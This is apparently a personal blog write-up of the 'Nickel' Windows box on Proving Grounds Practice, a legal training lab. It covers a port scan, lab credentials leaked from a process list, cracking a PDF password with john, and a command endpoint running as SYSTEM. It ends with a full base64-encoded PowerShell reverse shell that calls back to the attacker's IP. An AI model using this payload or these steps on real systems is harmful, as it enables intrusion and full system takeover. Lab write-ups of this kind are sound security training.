---
title: "PG Practice - Nickel"
date: 2026-06-23
draft: false
tags: ["Proving Grounds Practice", "Windows", "Write-Up"]
cover:
    image: "/images/writeup_screens/pg_nickel/pg_nickel_cover.svg"      
    alt: "Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| a | a |
| Difficulty | Intermediate |
| Type | Windows |

**Port Scan**

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2026-06-25T17:41:51+00:00
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2026-06-24T17:34:11
|_Not valid after:  2026-12-24T17:34:11
|_ssl-date: 2026-06-25T17:42:55+00:00; +1s from scanner time.
5040/tcp  open  unknown
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

## Local

There is a webserver running on port **33333** which says _Invalid Token_ when accessing it:

![](/images/writeup_screens/pg_nickel/pg_nickel1.png)

This doesn't seem interesting right now so we go on analyzing the other running webserver on port **8089**:

![](/images/writeup_screens/pg_nickel/pg_nickel2.png)

If we click on any of the three buttons the application tries to redirect us to a public IP on port **33333**:

![](/images/writeup_screens/pg_nickel/pg_nickel3.png)

If we look at the HTML Code we can see that the IP/Port as well as the respective endpoint names are hardcoded in the _action_ parameters: 

![](/images/writeup_screens/pg_nickel/pg_nickel8.png)

We are obviously not getting any response on the redirect here. What's interesting is the port number. As we have seen before the specific port **33333** is open on the target as well. This is why I tried to send a request to one of those endpoints but on our target instead: 

![](/images/writeup_screens/pg_nickel/pg_nickel4.png)

The response implies that the endpoint is there but we are using the wrong HTTP method. So I tried to send a POST Request instead. This time it worked and I received the running processes of the target machine as response. I was able to identify a running **cmd.exe** process with a start command that reveals clear-text credentials in the list: 

![](/images/writeup_screens/pg_nickel/pg_nickel5.png)

```
ariah:Tm93aXNlU2xvb3BUaGVvcnkxMzkK
```

In the process command we can find the parameter `--protocol ssh`. Thats why I tried to use these credentials for a SSH connection which wasn't successful. 

The password looked weird to me so I pasted it into [CyberChef](https://gchq.github.io/CyberChef/) and used the magic wand function which revealed that this is a **Base64** encoded string and can be decoded to `NowiseSloopTheory139`. With the actual password i was able to connect to the target via SSH with the user **ariah**. We can now read _C:\Users\ariah\Desktop\local.txt_.


## Proof

While enumerating the machine I came across the file _C:/ftp/Infrastructure.pdf_. This sounds interesting so i downloaded it with the following command: 

```
└─$ scp ariah@192.168.118.99:"C:/ftp/Infrastructure.pdf" ./
``` 

I tried to open the PDF locally but it is password protected. I extracted the hash from the file with: 

```
└─$ pdf2john Infrastructure.pdf 
```

I copy&pasted the output in a file _infrahash.txt_ and tried to crack it with john:

```
└─$ john --format=PDF --wordlist=/usr/share/wordlists/rockyou.txt infrahash.txt
```

After a few seconds I cracked the password: _ariah4168_

With this clear-text password I was able to read the PDF files contents: 

```
Infrastructure Notes

Temporary Command endpoint: http://nickel/?
Backup system: http://nickel-backup/backup
NAS: http://corp-nas/file
```

The "Temporary Command endpoint" catched my eye because there is always a possibilty we can execute commands with different privileges. We cannot try it out right away because _nickel_ is not a valid hostname. I suspected that _nickel_ just stands for a local webserver so I looked at the open connections with `> netstat -ano` and saw there is indeed a local webserver running. 

![](/images/writeup_screens/pg_nickel/pg_nickel6.png)

I then tried to access the Temporary Command endpoint URL on localhost and was able to execute commands as _SYSTEM_ user:

![](/images/writeup_screens/pg_nickel/pg_nickel7.png)

Afterwards I just had to create a netcat listener, generate a Base64 encoded powershell reverse shell command, URL encode it and send it as a GET parameter to the endpoint:

```
PS C:\> Invoke-WebRequest http://localhost/?powershell%20%2De%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5
ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0A
LgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBF
AG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0A
IAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBu
AGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== -UseBas
icParsing | Select-Object -Expand RawContent
```

Shortly after I received a _SYSTEM_ reverse shell and was able to read _C:\users\administrator\desktop\proof.txt_.